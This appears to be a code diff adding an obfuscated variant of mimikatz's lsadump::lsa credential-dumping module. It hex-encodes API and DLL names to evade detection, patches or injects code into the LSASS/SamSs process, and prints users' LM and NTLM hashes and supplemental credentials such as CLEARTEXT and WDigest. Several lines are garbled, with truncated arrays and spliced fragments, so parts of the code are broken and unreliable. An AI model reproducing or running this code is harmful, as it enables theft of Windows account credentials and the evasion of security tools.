+	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-24}},
+	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-21}},
+	{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-19}},
+	{KULL_M_WIN_BUILD_10_1709,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-21}},
+	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-24}},
+};
+#elif defined(_M_IX86)
+BYTE PTRN_WALL_SampQueryInformationUserInternal[]	= {0xc6, 0x40, 0x22, 0x00, 0x8b};
+BYTE PATC_WALL_JmpShort[]							= {0xeb, 0x04};
+KULL_M_PATCH_GENERIC SamSrvReferences[] = {
+	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-8}},
+	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-12}},
+	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-8}},
+	{KULL_M_WIN_BUILD_10(PCWCHAR )hid_a_d_v__BRCiA0E0EbnMPTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQuery
+	const char  hid_SamICo_VQwAg5JvA4ZA[] = {'\x53','\x61','\x6d','\x49','\x43','\x6f','\x6e','\x6e','\x65','\x63','\x74',0};
+
+	const char  hid_SamrCl_y9s0axNGcRE0[] = {'\x53','\x61','\x6d','\x72','\x43','\x6c','\x6f','\x73','\x65','\x48','\x61','\x6e','\x64','\x6c','\x65',0};
+
+	const char  hid_SamIRe_VFK4mF6DfgCM[] = {'\x53','\x61','\x6d','\x49','\x52','\x65','\x74','\x72','\x69','\x65','\x76','\x65','\x50','\x72','\x69','\x6d','\x61','\x72','\x79','\x43','\x72','\x65','\x64','\x65','\x6e','\x74','\x69','\x61','\x6c','\x73',0};
+
+	const char  hid_SamrOp_14aRsVqF2PZE[] = {'\x53','\x61','\x6d','\x72','\x4f','\x70','\x65','\x6e','\x44','\x6f','\x6d','\x61','\x69','\x6e',0};
+
+	const char  hid_SamrOp_2MMNi2ghAESL[] = {'\x53','\x61','\x6d','\x72','\x4f','\x70','\x65','\x6e','\x55','\x73','\x65','\x72',0};
+
+	const char  hid_SamrQu_oEpnPi3poF9c[] = {'\x53','\x61','\x6d','\x72','\x51','\x75','\x65','\x72','\x79','\x49','\x6e','\x66','\x6f','\x72','\x6d','\x61','\x74','\x69','\x6f','\x6e','\x55','\x73','\x65','\x72',0};
+
+	const char  hid_SamIFr_4Kromi12sNi7[] = {'\x53','\x61','\x6d','\x49','\x46','\x72','\x65','\x65','\x5f','\x53','\x41','\x4d','\x50','\x52','\x5f','\x55','\x53','\x45','\x52','\x5f','\x49','\x4e','\x46','\x4f','\x5f','\x42','\x55','\x46','\x46','\x45','\x52',0};
+
+	const char  hid_Virtua_R2yUlILT2kLf[] = {'\x56','\x69','\x72','\x74','\x75','\x61','\x6c','\x41','\x6c','\x6c','\x6f','\x63',0};
+
+	const char  hid_LocalF_aV34p8MG77I8[] = {'\x4c','\x6f','\x63','\x61','\x6c','\x46','\x72','\x65','\x65',0};
+
+	const char  hid_memcpy_eAJtQcyE29G4[] = {'\x6d','\x65','\x6d','\x63','\x70','\x79',0};
+
+	const char  hid_LocalA_IZOezK3WfiJX[] = {'\x4c','\x6f','\x63','\x61','\x6c','\x41','\x6c','\x6c','\x6f','\x63',0};
+
+	 wchar_t  hid_s_a_m__ELiw0kTlDJ6c[] = {'\x73','\x61','\x6d','\x73','\x72','\x76','\x2e','\x64','\x6c','\x6c',0};
+
+	 wchar_t  hid_D_o_m__tXen3w1iu2ip[] = {'\x44','\x6f','\x6d','\x61','\x69','\x6e','\x20','\x3a','\x20','\x25','\x77','\x5a','\x20','\x2f','\x20',0};
+	typedef NTSTATUS(__stdcall* _SamCloseHandle)(SAMPR_HANDLE SamHandle);
+	TCHAR hid_samlib_jKqBvu3QDk3n[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_UNMtPe71rWoN = LoadLibrary(hid_samlib_jKqBvu3QDk3n);
+	TCHAR hid_SamClo_cDKtoCiy4DXr[] = {'\x53','\x61','\x6d','\x43','\x6c','\x6f','\x73','\x65','\x48','\x61','\x6e','\x64','\x6c','\x65',0};
+
+	_SamCloseHandle hid_SamClo_3YviesPAFdRG = (_SamCloseHandle) GetProcAddress(hid_hHandl_UNMtPe71rWoN, hid_SamClo_cDKtoCiy4DXr);
+	TCHAR hid_samlib_ylO2blDTDXAf[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_g8bUZBM1N7Io = LoadLibrary(hid_samlib_ylO2blDTDXAf);
+	TCHAR hid_SamClo_zoMN8ezJFijl[] = {'\x53','\x61','\x6d','\x43','\x6c','\x6f','\x73','\x65','\x48','\x61','\x6e','\x64','\x6c','\x65',0};
+
+	_SamCloseHandle hid_SamClo_5t4fTKvr8JNH = (_SamCloseHandle) GetProcAddress(hid_hHandl_g8bUZBM1N7Io, hid_SamClo_zoMN8ezJFijl);
+	typedef NTSTATUS (__stdcall* _SamEnumerateDomainsInSamServer)(SAMPR_HANDLE ServerHandle, DWORD * EnumerationContext, PSAMPR_RID_ENUMERATION* Buffer, DWORD PreferedMaximumLength,DWORD * CountReturned);
+	TCHAR hid_samlib_syuY2Zskjpz4[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_pkGWYafr5wpU = LoadLibrary(hid_samlib_syuY2Zskjpz4);
+	TCHAR hid_SamCon_zMJXHenpbG9f[] = {'\x53','\x61','\x6d','\x43','\x6f','\x6e','\x6e','\x65','\x63','\x74',0};
+
+	_SamConnect hid_SamCon_ZADQQtpdUNpB = (_SamConnect) GetProcAddress(hid_hHandl_pkGWYafr5wpU, hid_SamCon_zMJXHenpbG9f);
+	typedef NTSTATUS(__stdcall* _SamEnumerateUsersInDomain)(SAMPR_HANDLE DomainHandle, PDWORD EnumerationContext, DWORD UserAccountControl, PSAMPR_RID_ENUMERATION* Buffer, DWORD PreferedMaximumLength, PDWORD CountReturned);
+	TCHAR hid_samlib_nGK6HrU8LHfh[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_L6gmgxBpgJkR = LoadLibrary(hid_samlib_nGK6HrU8LHfh);
+	TCHAR hid_SamEnu_CCoOUCx5GPtL[] = {'\x53','\x61','\x6d','\x45','\x6e','\x75','\x6d','\x65','\x72','\x61','\x74','\x65','\x55','\x73','\x65','\x72','\x73','\x49','\x6e','\x44','\x6f','\x6d','\x61','\x69','\x6e',0};
+
+	_SamEnumerateUsersInDomain hid_SamEnu_HQXrirzwLNuU = (_SamEnumerateUsersInDomain) GetProcAddress(hid_hHandl_L6gmgxBpgJkR, hid_SamEnu_CCoOUCx5GPtL);
+	typedef NTSTATUS(__stdcall* _SamFreeMemory)(PVOID Buffer);
+	TCHAR hid_samlib_iMNl0mIbq1wA[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_JvJ33vTqtn59 = LoadLibrary(hid_samlib_iMNl0mIbq1wA);
+	TCHAR hid_SamFre_mAYdZG2CA9xd[] = {'\x53','\x61','\x6d','\x46','\x72','\x65','\x65','\x4d','\x65','\x6d','\x6f','\x72','\x79',0};
+
+	_SamFreeMemory hid_SamFre_uQFcPHamtCsK = (_SamFreeMemory) GetProcAddress(hid_hHandl_JvJ33vTqtn59, hid_SamFre_mAYdZG2CA9xd);
+	TCHAR hid_samlib_y76gLgUF1vXR[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_TQls4IXClbqj = LoadLibrary(hid_samlib_y76gLgUF1vXR);
+	TCHAR hid_SamFre_CPZZu4mFtRRM[] = {'\x53','\x61','\x6d','\x46','\x72','\x65','\x65','\x4d','\x65','\x6d','\x6f','\x72','\x79',0};
+
+	_SamFreeMemory hid_SamFre_7YWn5EFO6QUk = (_SamFreeMemory) GetProcAddress(hid_hHandl_TQls4IXClbqj, hid_SamFre_CPZZu4mFtRRM);
+	TCHAR hid_samlib_fQWnkRIV77Va[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_K30tyNWZvCHQ = LoadLibrary(hid_samlib_fQWnkRIV77Va);
+	TCHAR hid_SamFre_cjMPZVsTgoaz[] = {'\x53','\x61','\x6d','\x46','\x72','\x65','\x65','\x4d','\x65','\x6d','\x6f','\x72','\x79',0};
+
+	_SamFreeMemory hid_SamFre_T6j8U7odNjCu = (_SamFreeMemory) GetProcAddress(hid_hHandl_K30tyNWZvCHQ, hid_SamFre_cjMPZVsTgoaz);
+	TCHAR hid_samlib_uTIZYgP89ZIS[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_hvkp24S6s9BL = LoadLibrary(hid_samlib_uTIZYgP89ZIS);
+	TCHAR hid_SamFre_l937tD3odTJY[] = {'\x53','\x61','\x6d','\x46','\x72','\x65','\x65','\x4d','\x65','\x6d','\x6f','\x72','\x79',0};
+
+	_SamFreeMemory hid_SamFre_YmW9DWqUszvS = (_SamFreeMemory) GetProcAddress(hid_hHandl_hvkp24S6s9BL, hid_SamFre_l937tD3odTJY);
+	TCHAR hid_samlib_zl35nA9BhadE[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_xZf7tci5tCYE = LoadLibrary(hid_samlib_zl35nA9BhadE);
+	TCHAR hid_SamFre_ZgB3uw92oXsZ[] = {'\x53','\x61','\x6d','\x46','\x72','\x65','\x65','\x4d','\x65','\x6d','\x6f','\x72','\x79',0};
+
+	_SamFreeMemory hid_SamFre_Ir9yXtXfjiv9 = (_SamFreeMemory) GetProcAddress(hid_hHandl_xZf7tci5tCYE, hid_SamFre_ZgB3uw92oXsZ);
+	typedef NTSTATUS(__stdcall* _SamLookupIdsInDomain)(SAMPR_HANDLE DomainHandle, DWORD Count, PDWORD RelativeIds, PUNICODE_STRING * Names, PDWORD * Use);
+	TCHAR hid_samlib_ThfDO86tlF5D[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_1K0tYI7xU2Ah = LoadLibrary(hid_samlib_ThfDO86tlF5D);
+	TCHAR hid_SamLoo_AKILI4ZdnEl1[] = {'\x53','\x61','\x6d','\x4c','\x6f','\x6f','\x6b','\x75','\x70','\x49','\x64','\x73','\x49','\x6e','\x44','\x6f','\x6d','\x61','\x69','\x6e',0};
+
+	_SamLookupIdsInDomain hid_SamLoo_k1yxteHjr1If = (_SamLookupIdsInDomain) GetProcAddress(hid_hHandl_1K0tYI7xU2Ah, hid_SamLoo_AKILI4ZdnEl1);
+	typedef NTSTATUS(__stdcall* _SamLookupNamesInDomain)(SAMPR_HANDLE DomainHandle, DWORD Count, PUNICODE_STRING Names, PDWORD * RelativeIds, PDWORD * Use);
+	TCHAR hid_samlib_ZzL6Sfhd4V7E[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_aKHf0ecXlUCM = LoadLibrary(hid_samlib_ZzL6Sfhd4V7E);
+	TCHAR hid_SamLoo_VgwVnBym44X4[] = {'\x53','\x61','\x6d','\x4c','\x6f','\x6f','\x6b','\x75','\x70','\x4e','\x61','\x6d','\x65','\x73','\x49','\x6e','\x44','\x6f','\x6d','\x61','\x69','\x6e',0};
+
+	_SamLookupNamesInDomain hid_SamLoo_dLbRJPmem0j1 = (_SamLookupNamesInDomain) GetProcAddress(hid_hHandl_aKHf0ecXlUCM, hid_SamLoo_VgwVnBym44X4);
+	typedef NTSTATUS(__stdcall* _SamOpenDomain)(SAMPR_HANDLE SamHandle, ACCESS_MASK DesiredAccess, PSID DomainId, SAMPR_HANDLE * DomainHandle);
+	TCHAR hid_samlib_voN0JChiETAt[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_3VLmqmn7ibpo = LoadLibrary(hid_samlib_voN0JChiETAt);
+	TCHAR hid_SamOpe_PnpUxg6DU67M[] = {'\x53','\x61','\x6d','\x4f','\x70','\x65','\x6e','\x44','\x6f','\x6d','\x61','\x69','\x6e',0};
+
+	_SamOpenDomain hid_SamOpe_7pwoC5vmlb6k = (_SamOpenDomain) GetProcAddress(hid_hHandl_3VLmqmn7ibpo, hid_SamOpe_PnpUxg6DU67M);
+InformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-8}},
+	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PA(PCWCHAR )hid_k_e_r__dSXw0e1eJdtJt),	PATC_WALL_JmpShort},	{-12}},
+};
+#endif
+
+const wchar_t  hid_s_a_m__nbXpY1RZSFzY[] = {'\x73','\x61','\x6d','\x73','\x72','\x76','\x2e','\x64','\x6(PCWCHAR )hid_n_t_d__VKsStjN9FUmy;
+
+const wchar_t  hid_l_s_a__acSujl0YNKN5[] = {'\x6c','\x73','\x61','(PCWCHAR )hid_l_s_a__acSujl0YNKN5'\x76','\x2e','\x64
+const wchar_t  hid_n_t_d__VKsStjN9FUmy[] = {'\x6e','\x74','\x64','\x6c','\x6c','\x2e','\x6
+const wchar_t  hid_k_e_r__dSXw0e1eJdtJ[] = {'\x6b','\x65','\x72','\x6e','\x65','\x6c','\x33','\x32','\x2e','\x64',
+const wchar_t  hid_a_d_v__BRCiA0E0EbnM[] = {'\x61','\x64','\x76','\x61','\x70','\x69','\x33','\x32','\x2e','\x64','\x6c','\x6c',0};
+szAdvapi32	
+
+	REMOTE_EXT extensions[] = {
+		{szSamSrv,	hid_SamICo_VQwAg5JvA4ZA,						(PVOID) 0x4141414141414141, NULL},
+		{szSamSrv,	hid_SamrCl_y9s0axNGcRE0,					(PVOID) 0x4242424242424242, NULL},
+		{szSamSrv,	hid_SamIRe_VFK4mF6DfgCM,	(PVOID) 0x4343434343434343, NULL},
+		{szSamSrv,	hid_SamrOp_14aRsVqF2PZE,					(PVOID) 0x4444444444444444, NULL},
+		{szSamSrv,	hid_SamrOp_2MMNi2ghAESL,						(PVOID) 0x4545454545454545, NULL},
+		{szSamSrv,	hid_SamrQu_oEpnPi3poF9c,			(PVOID) 0x4646464646464646, NULL},
+		{szSamSrv,	hid_SamIFr_4Kromi12sNi7,	(PVOID) 0x4747474747474747, NULL},
+		{szKernel32,hid_Virtua_R2yUlILT2kLf,						(PVOID) 0x4a4a4a4a4a4a4a4a, NULL},
+		{szKernel32,hid_LocalF_aV34p8MG77I8,						(PVOID) 0x4b4b4b4b4b4b4b4b, NULL},
+		{szNtDll,	hid_memcpy_eAJtQcyE29G4,							(PVOID) 0x4c4c4c4c4c4c4c4c, NULL},
+		{szKernel32,hid_LocalA_IZOezK3WfiJX,						(PVOID) 0x4d4d4d4d4d4d4d4d, NULL},
+	};
+	MULTIPLE_REMOTE_EXT extForCb = {ARRAYSIZE(extensions), extensions};
+	
+	if(!isPatching && kull_m_string_args_byName(argc, argv, L"patch", NULL, NULL))
+	{
+		if(currentSamSrvReference = kull_m_patch_getGenericFromBuild(SamSrvReferences, ARRAYSIZE(SamSrvReferences), MIMIKATZ_NT_BUILD_NUMBER))
+		{
+			aPatternMemory.address = currentSamSrvReference->Search.Pattern;
+			aPatchMemory.address = currentSamSrvReference->Patch.Pattern;
+
+			if(kuhl_m_lsadump_lsa_getHandle(&hMemory, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION))
+			{
+				if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, hid_s_a_m__ELiw0kTlDJ6c, &iModuleSamSrv))
+				{
+					sMemory.kull_m_memoryRange.kull_m_memoryAdress = iModuleSamSrv.DllBase;
+					sMemory.kull_m_memoryRange.size = iModuleSamSrv.SizeOfImage;
+					isPatching = TRUE;
+					if(!kull_m_patch(&sMemory, &aPatternMemory, currentSamSrvReference->Search.Length, &aPatchMemory, currentSamSrvReference->Patch.Length, currentSamSrvReference->Offsets.off0, kuhl_m_lsadump_lsa, argc, argv, NULL))
+						PRINT_ERROR_AUTO(L"kull_m_patch");
+					isPatching = FALSE;
+				}
+				else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
+			}
+		}
+	}
+	else
+	{
+		if(!isPatching && kull_m_string_args_byName(argc, argv, L"inject", NULL, NULL))
+		{
+			if(kuhl_m_lsadump_lsa_getHandle(&hMemory, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD))
+			{
+				if(kull_m_remotelib_CreateRemoteCodeWitthPatternReplace(hMemory, kuhl_sekurlsa_samsrv_thread, (DWORD) ((PBYTE) kuhl_sekurlsa_samsrv_thread_end - (PBYTE) kuhl_sekurlsa_samsrv_thread), &extForCb, &aRemoteFunc))
+					aRemoteThread = &aRemoteFunc;
+				else PRINT_ERROR(L"kull_m_remotelib_CreateRemoteCodeWitthPatternReplace\n");
+			}
+		}
+		RtlZeroMemory(&objectAttributes, sizeof(LSA_OBJECT_ATTRIBUTES));
+		if(NT_SUCCESS(LsaOpenPolicy(NULL, &objectAttributes, POLICY_VIEW_LOCAL_INFORMATION, &hPolicy)))
+		{
+			if(NT_SUCCESS(LsaQueryInformationPolicy(hPolicy, PolicyAccountDomainInformation, (PVOID *) &pPolicyDomainInfo)))
+			{
+				status = hid_SamCon_ZADQQtpdUNpB(NULL, &hSam, 0x000F003F, FALSE);
+				if(NT_SUCCESS(status))
+				{
+					status = hid_SamOpe_7pwoC5vmlb6k(hSam, 0x705, pPolicyDomainInfo->DomainSid, &hDomain);
+					if(NT_SUCCESS(status))
+					{
+						kprintf(hid_D_o_m__tXen3w1iu2ip, &pPolicyDomainInfo->DomainName);
+						kull_m_string_displaySID(pPolicyDomainInfo->DomainSid);
+						kprintf(L"\n");
+						
+						if(kull_m_string_args_byName(argc, argv, L"id", &szRid, NULL))
+						{
+							if(rid = wcstoul(szRid, NULL, 0))
+							{
+								status = hid_SamLoo_k1yxteHjr1If(hDomain, 1, &rid, &puName, &pUse);
+								if(NT_SUCCESS(status))
+								{
+									kuhl_m_lsadump_lsa_user(hDomain, pPolicyDomainInfo->DomainSid, rid, puName, aRemoteThread);
+									hid_SamFre_uQFcPHamtCsK(puName);
+									hid_SamFre_7YWn5EFO6QUk(pUse);
+								} else PRINT_ERROR(L"SamLookupIdsInDomain %08x\n", status);
+							}
+							else PRINT_ERROR(L"\'%s\' is not a valid Id\n", szRid);
+
+						}
+						else if(kull_m_string_args_byName(argc, argv, L"name", &szName, NULL) || kull_m_string_args_byName(argc, argv, L"user", &szName, NULL))
+						{
+							RtlInitUnicodeString(&uName, szName);
+							status = hid_SamLoo_dLbRJPmem0j1(hDomain, 1, &uName, &pRid, &pUse);
+							if(NT_SUCCESS(status))
+							{
+								kuhl_m_lsadump_lsa_user(hDomain, pPolicyDomainInfo->DomainSid, *pRid, &uName, aRemoteThread);
+								hid_SamFre_T6j8U7odNjCu(pRid);
+								hid_SamFre_YmW9DWqUszvS(pUse);
+							} else PRINT_ERROR(L"SamLookupNamesInDomain %08x\n", status);
+						}
+						else
+						{
+							do
+							{
+								enumStatus = hid_SamEnu_HQXrirzwLNuU(hDomain, &EnumerationContext, 0, &pEnumBuffer, 100, &CountRetourned);
+								if(NT_SUCCESS(enumStatus) || enumStatus == STATUS_MORE_ENTRIES)
+								{
+									for(i = 0; i < CountRetourned; i++)
+										kuhl_m_lsadump_lsa_user(hDomain, pPolicyDomainInfo->DomainSid, pEnumBuffer[i].RelativeId, &pEnumBuffer[i].Name, aRemoteThread);
+									hid_SamFre_Ir9yXtXfjiv9(pEnumBuffer);
+								} else PRINT_ERROR(L"SamEnumerateUsersInDomain %08x\n", enumStatus);
+							} while(enumStatus == STATUS_MORE_ENTRIES);
+						}
+						hid_SamClo_5t4fTKvr8JNH(hDomain);
+					} else PRINT_ERROR(L"SamOpenDomain %08x\n", status);
+					hid_SamClo_3YviesPAFdRG(hSam);
+				} else PRINT_ERROR(L"SamConnect %08x\n", status);
+				LsaFreeMemory(pPolicyDomainInfo);
+			}
+			LsaClose(hPolicy);
+		}
+
+		if(aRemoteThread)
+			kull_m_memory_free(aRemoteThread);
+	}
+
+	if(hMemory)
+	{
+		if(hMemory->pHandleProcess->hProcess)
+			CloseHandle(hMemory->pHandleProcess->hProcess);
+		kull_m_memory_close(hMemory);
+	}
+	return status;
+}
+
+BOOL kuhl_m_lsadump_lsa_getHandle(PKULL_M_MEMORY_HANDLE * hMemory, DWORD Flags)
+{
+	
+	 wchar_t  hid_S_a_m__69zfoMP8wjrN[] = {'\x53','\x61','\x6d','\x53','\x73',0};
+BOOL success = FALSE;
+	SERVICE_STATUS_PROCESS ServiceStatusProcess;
+	HANDLE hProcess;
+
+	if(kull_m_service_getUniqueForName(hid_S_a_m__69zfoMP8wjrN, &ServiceStatusProcess))
+	{
+		if(hProcess = OpenProcess(Flags, FALSE, ServiceStatusProcess.dwProcessId))
+		{
+			if(!(success = kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, hMemory)))
+				CloseHandle(hProcess);
+		}
+		else PRINT_ERROR_AUTO(L"OpenProcess");
+	}
+	else PRINT_ERROR_AUTO(L"kull_m_service_getUniqueForName");
+	return success;
+}
+
+
+void kuhl_m_lsadump_lsa_user(SAMPR_HANDLE DomainHandle, PSID DomainSid, DWORD rid, PUNICODE_STRING name, PKULL_M_MEMORY_ADDRESS aRemoteThread)
+{
+	
+	 wchar_t  hid___R_I__YRmdrE9sf7uv[] = {'\n','\x52','\x49','\x44','\x20','\x20','\x3a','\x20','\x25','\x30','\x38','\x78','\x20','\x28','\x25','\x75','\x29','\n','\x55','\x73','\x65','\x72','\x20','\x3a','\x20','\x25','\x77','\x5a','\n',0};
+
+	 wchar_t  hid_L_M____y7xHmH5vBfK6[] = {'\x4c','\x4d','\x20','\x20','\x20','\x3a','\x20',0};
+
+	 wchar_t  hid___N_T__wShaGLa3efPj[] = {'\n','\x4e','\x54','\x4c','\x4d','\x20','\x3a','\x20',0};
+	TCHAR hid_samlib_O5T5U9gYnwqK[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_elobcEE0Mi1B = LoadLibrary(hid_samlib_O5T5U9gYnwqK);
+	TCHAR hid_SamClo_tMUhiUQ9UBlM[] = {'\x53','\x61','\x6d','\x43','\x6c','\x6f','\x73','\x65','\x48','\x61','\x6e','\x64','\x6c','\x65',0};
+
+	_SamCloseHandle hid_SamClo_jtUU5YbFLDWi = (_SamCloseHandle) GetProcAddress(hid_hHandl_elobcEE0Mi1B, hid_SamClo_tMUhiUQ9UBlM);
+	TCHAR hid_samlib_7BvdE8Lo1jV2[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_xQmJPeG5kU8T = LoadLibrary(hid_samlib_7BvdE8Lo1jV2);
+	TCHAR hid_SamFre_q3KfDJhbJep1[] = {'\x53','\x61','\x6d','\x46','\x72','\x65','\x65','\x4d','\x65','\x6d','\x6f','\x72','\x79',0};
+
+	_SamFreeMemory hid_SamFre_JfJERbaB2r1v = (_SamFreeMemory) GetProcAddress(hid_hHandl_xQmJPeG5kU8T, hid_SamFre_q3KfDJhbJep1);
+	typedef NTSTATUS(__stdcall* _SamOpenUser)(SAMPR_HANDLE DomainHandle, ACCESS_MASK DesiredAccess, DWORD UserId, SAMPR_HANDLE * UserHandle);
+	TCHAR hid_samlib_jIC6Ybeerqvf[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_XHo6OH3iiU6J = LoadLibrary(hid_samlib_jIC6Ybeerqvf);
+	TCHAR hid_SamOpe_VuZjc2dBtCZk[] = {'\x53','\x61','\x6d','\x4f','\x70','\x65','\x6e','\x55','\x73','\x65','\x72',0};
+
+	_SamOpenUser hid_SamOpe_6JMCPFhIS8pB = (_SamOpenUser) GetProcAddress(hid_hHandl_XHo6OH3iiU6J, hid_SamOpe_VuZjc2dBtCZk);
+	typedef NTSTATUS(__stdcall* _SamQueryInformationUser)(SAMPR_HANDLE UserHandle, USER_INFORMATION_CLASS UserInformationClass, PSAMPR_USER_INFO_BUFFER* Buffer);
+	TCHAR hid_samlib_5jT7NbDj91x7[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_748tfaXpjxXC = LoadLibrary(hid_samlib_5jT7NbDj91x7);
+	TCHAR hid_SamQue_JGqBt13nphGu[] = {'\x53','\x61','\x6d','\x51','\x75','\x65','\x72','\x79','\x49','\x6e','\x66','\x6f','\x72','\x6d','\x61','\x74','\x69','\x6f','\x6e','\x55','\x73','\x65','\x72',0};
+
+	_SamQueryInformationUser hid_SamQue_sqsF6ZNxDleM = (_SamQueryInformationUser) GetProcAddress(hid_hHandl_748tfaXpjxXC, hid_SamQue_JGqBt13nphGu);
+SAMPR_HANDLE hUser;
+	PSAMPR_USER_INFO_BUFFER pUserInfoBuffer;
+	NTSTATUS status;
+	DWORD BufferSize = 0, i;
+	PLSA_SUPCREDENTIALS pCreds = NULL;
+	PLSA_SUPCREDENTIAL pCred;
+	PREMOTE_LIB_INPUT_DATA iData;
+	REMOTE_LIB_OUTPUT_DATA oData;
+
+	kprintf(hid___R_I__YRmdrE9sf7uv, rid, rid, name);
+
+	if(!aRemoteThread)
+	{
+		status = hid_SamOpe_6JMCPFhIS8pB(DomainHandle, 0x31b, rid, &hUser);
+		if(NT_SUCCESS(status))
+		{
+			status = hid_SamQue_sqsF6ZNxDleM(hUser, UserInternal1Information, &pUserInfoBuffer);
+			if(NT_SUCCESS(status))
+			{
+				kprintf(hid_L_M____y7xHmH5vBfK6);
+				if(pUserInfoBuffer->Internal1.LmPasswordPresent)
+					kull_m_string_wprintf_hex(pUserInfoBuffer->Internal1.LMHash, LM_NTLM_HASH_LENGTH, 0);
+				kprintf(hid___N_T__wShaGLa3efPj);
+				if(pUserInfoBuffer->Internal1.NtPasswordPresent)
+					kull_m_string_wprintf_hex(pUserInfoBuffer->Internal1.NTHash, LM_NTLM_HASH_LENGTH, 0);
+				kprintf(L"\n");
+				hid_SamFre_JfJERbaB2r1v(pUserInfoBuffer);
+			} else PRINT_ERROR(L"SamQueryInformationUser %08x\n", status);
+			hid_SamClo_jtUU5YbFLDWi(hUser);
+		} else PRINT_ERROR(L"SamOpenUser %08x\n", status);
+	}
+	else
+	{
+		if(iData = kull_m_remotelib_CreateInput(NULL, rid, GetLengthSid(DomainSid), DomainSid))
+		{
+			if(kull_m_remotelib_create(aRemoteThread, iData, &oData))
+			{
+				if(pCreds = (PLSA_SUPCREDENTIALS) oData.outputData)
+				{
+					for(i = 0; i < pCreds->count; i++)
+					{
+						pCred = ((PLSA_SUPCREDENTIAL) ((PBYTE) pCreds + sizeof(LSA_SUPCREDENTIALS))) + i;
+						if(pCred->offset && pCred->size)
+							kuhl_m_lsadump_lsa_DescrBuffer(pCred->type, rid, (PBYTE) pCreds + pCred->offset, pCred->size);
+					}
+					LocalFree(pCreds);
+				}
+			}
+			LocalFree(iData);
+		}
+	}
+}
+
+
+const wchar_t  hid_P_r_i__71MzXUZ1XqUQ[] = {'\x50','\x72','\x69','\x6d','\x61','\x72','\x79',0};
+
+const wchar_t  hid_C_L_E__vGwv79GJ6ZHn[] = {'\x43','\x4c','\x45','\x41','\x52','\x54','\x45','\x58','\x54',0};
+
+const wchar_t  hid_W_D_i__U09ofwpwlz91[] = {'\x57','\x44','\x69','\x67','\x65','\x73','\x74',0};
+
